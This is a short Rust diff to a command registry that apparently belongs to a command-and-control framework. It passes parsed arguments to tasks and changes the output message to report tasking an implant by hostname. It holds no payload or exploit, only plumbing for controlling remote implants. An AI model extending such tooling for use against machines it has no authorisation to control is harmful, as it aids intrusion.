@@ -218,7 +218,12 @@ impl CommandRegistry {
                     }
                 };
 
-                if match session.create_task(command.name().to_string()) {
+                let args = match parsed_args.downcast::<Vec<String>>() {
+                    Ok(args) => *args,
+                    Err(_) => return Err(CommandError::Internal("Invalid arguments type".into())),
+                };
+
+                if match session.create_task(command.name().to_string(), args) {
                     Ok(_) => true,
                     Err(err) => {
                         return Err(CommandError::TargetNotFound(format!(
@@ -230,9 +235,9 @@ impl CommandRegistry {
                     // Execute command with the parsed arguments
                     // command.execute_with_parsed_args(context, parsed_args)
                     Ok(CommandOutput::Text(format!(
-                        "Command '{}' executed on session ID '{}'",
+                        "Tasked implant {} with '{}'",
+                        session.implant_hostname(),
                         command.name(),
-                        session_id
                     )))
                 } else {
                     Err(CommandError::TargetNotFound(format!(
